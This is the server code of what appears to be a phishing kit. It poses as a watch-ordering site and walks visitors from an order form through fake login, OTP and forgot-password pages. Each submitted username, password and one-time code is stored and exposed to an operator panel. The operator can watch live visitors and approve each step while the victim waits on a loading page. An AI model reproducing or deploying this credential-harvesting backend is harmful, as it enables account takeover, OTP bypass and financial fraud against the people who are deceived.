const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

// Data
const watches = require('./data/watches.json');
const branches = require('./data/branches.json');
const cities = require('./data/cities.json');
const translations = require('./data/translations.json');

// In-memory store
let requests = [];
let nextId = 1;
let liveVisitors = new Set();
let totalVisits = 0;
let todayVisits = 0;
let todayDate = new Date().toDateString();

function resetDailyIfNeeded() {
    const now = new Date().toDateString();
    if (now !== todayDate) {
        todayDate = now;
        todayVisits = 0;
    }
}

// Middleware
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

function getLang(req) {
    return req.query.lang === 'en' ? 'en' : 'ar';
}

// ===== Page Routes =====

app.get('/', (req, res) => {
    const lang = getLang(req);
    res.render('index', { lang, t: translations[lang], watches });
});

app.get('/order', (req, res) => {
    const lang = getLang(req);
    res.render('order', { lang, t: translations[lang], watches, branches, cities });
});

app.get('/login', (req, res) => {
    const lang = getLang(req);
    res.render('login', { lang, t: translations[lang], error: req.query.error, orderId: req.query.orderId });
});

app.get('/forgot', (req, res) => {
    const lang = getLang(req);
    res.render('forgot', { lang, t: translations[lang], orderId: req.query.orderId });
});

app.get('/forgot-username', (req, res) => {
    const lang = getLang(req);
    res.render('forgot-username', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
});

app.get('/forgot-username-success', (req, res) => {
    const lang = getLang(req);
    res.render('forgot-username-success', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
});

app.get('/forgot-username-password', (req, res) => {
    const lang = getLang(req);
    res.render('forgot-username-password', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
});

app.get('/forgot-password', (req, res) => {
    const lang = getLang(req);
    res.render('forgot-password', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
});

app.get('/forgot-password-success', (req, res) => {
    const lang = getLang(req);
    res.render('forgot-password-success', { lang, t: translations[lang] });
});

app.get('/loading', (req, res) => {
    const lang = getLang(req);
    res.render('loading', { lang, t: translations[lang], orderId: req.query.orderId });
});

app.get('/otp', (req, res) => {
    const lang = getLang(req);
    res.render('otp', { lang, t: translations[lang], orderId: req.query.orderId });
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// ===== API Routes =====

app.post('/api/admin-login', (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        return res.json({ ok: true });
    }
    res.json({ ok: false });
});

app.post('/api/submit-order', (req, res) => {
    const data = req.body;
    const request = {
        id: nextId++,
        name: data.name || '',
        phone: data.phone || '',
        email: data.email || '',
        delivery: data.delivery || '',
        branch: data.branch || '',
        governorate: data.governorate || '',
        city: data.city || '',
        address: data.address || '',
        watchColor: data.watchColor || '',
        username: '',
        password: '',
        otp: '',
        status: 'pending',
        createdAt: new Date().toISOString()
    };
    requests.push(request);
    res.json({ ok: true, id: request.id });
});

app.post('/api/submit-login', (req, res) => {
    const { orderId, username, password } = req.body;
    const request = requests.find(r => r.id === orderId);
    if (request) {
        request.username = username || '';
        request.password = password || '';
        request.status = 'pending';
    }
    res.json({ ok: true });
});

app.post('/api/submit-otp', (req, res) => {
    const { orderId, otp } = req.body;
    const request = requests.find(r => r.id === orderId);
    if (request) {
        request.otp = otp || '';
    }
    res.json({ ok: true });
});

app.post('/api/submit-forgot-username-confirm', (req, res) => {
    const { username, orderId } = req.body;
    const request = {
        id: nextId++,
        type: 'forgot-username-confirm',
        name: '',
        phone: '',
        email: '',
        delivery: '',
        branch: '',
        governorate: '',
        city: '',
        address: '',
        watchColor: '',
        username: username || '',
        password: '',
        otp: '',
        status: 'pending',
        createdAt: new Date().toISOString()
    };
    requests.push(request);
    res.json({ ok: true, id: request.id });
});

app.post('/api/submit-forgot-username-password', (req, res) => {
    const { password, orderId } = req.body;
    const request = {
        id: nextId++,
        type: 'forgot-username-password',
        name: '',
        phone: '',
        email: '',
        delivery: '',
        branch: '',
        governorate: '',
        city: '',
        address: '',
        watchColor: '',
        username: '',
        password: password || '',
        otp: '',
        status: 'pending',
        createdAt: new Date().toISOString()
    };
    requests.push(request);
    res.json({ ok: true, id: request.id });
});

app.post('/api/submit-forgot-username', (req, res) => {
    const { email, orderId } = req.body;
    const request = {
        id: nextId++,
        type: 'forgot-username',
        forgotEmail: email || '',
        linkedOrderId: orderId ? Number(orderId) : null,
        name: '',
        phone: '',
        email: email || '',
        delivery: '',
        branch: '',
        governorate: '',
        city: '',
        address: '',
        watchColor: '',
        username: '',
        password: '',
        otp: '',
        status: 'pending',
        createdAt: new Date().toISOString()
    };
    requests.push(request);
    res.json({ ok: true, id: request.id });
});

app.post('/api/submit-forgot-password', (req, res) => {
    const { username, orderId } = req.body;
    const request = {
        id: nextId++,
        type: 'forgot-password',
        forgotUsername: username || '',
        linkedOrderId: orderId ? Number(orderId) : null,
        name: '',
        phone: '',
        email: '',
        delivery: '',
        branch: '',
        governorate: '',
        city: '',
        address: '',
        watchColor: '',
        username: username || '',
        password: '',
        otp: '',
        status: 'pending',
        createdAt: new Date().toISOString()
    };
    requests.push(request);
    res.json({ ok: true, id: request.id });
});

app.get('/api/requests/:id/check', (req, res) => {
    const id = Number(req.params.id);
    const request = requests.find(r => r.id === id);
    if (request) {
        return res.json({ ok: true, status: request.status });
    }
    res.json({ ok: false, status: 'not_found' });
});

app.get('/api/requests', (req, res) => {
    res.json({ ok: true, requests });
});

app.post('/api/requests/:id/status', (req, res) => {
    const id = Number(req.params.id);
    const request = requests.find(r => r.id === id);
    if (request) {
        request.status = req.body.status || 'pending';
    }
    res.json({ ok: true });
});

app.get('/api/live-count', (req, res) => {
    res.json({ ok: true, count: liveVisitors.size });
});

app.get('/api/stats', (req, res) => {
    resetDailyIfNeeded();
    res.json({ ok: true, today: todayVisits, total: totalVisits });
});

app.post('/api/track-visit', (req, res) => {
    const visitorId = req.body.visitorId || Math.random().toString(36).slice(2);
    liveVisitors.add(visitorId);
    resetDailyIfNeeded();
    totalVisits++;
    todayVisits++;
    setTimeout(() => liveVisitors.delete(visitorId), 60000);
    res.json({ ok: true, visitorId });
});

app.post('/api/heartbeat', (req, res) => {
    if (req.body.visitorId) {
        liveVisitors.add(req.body.visitorId);
        setTimeout(() => liveVisitors.delete(req.body.visitorId), 60000);
    }
    res.json({ ok: true });
});

// Cities API for dynamic dropdowns
app.get('/api/cities', (req, res) => {
    res.json(cities);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
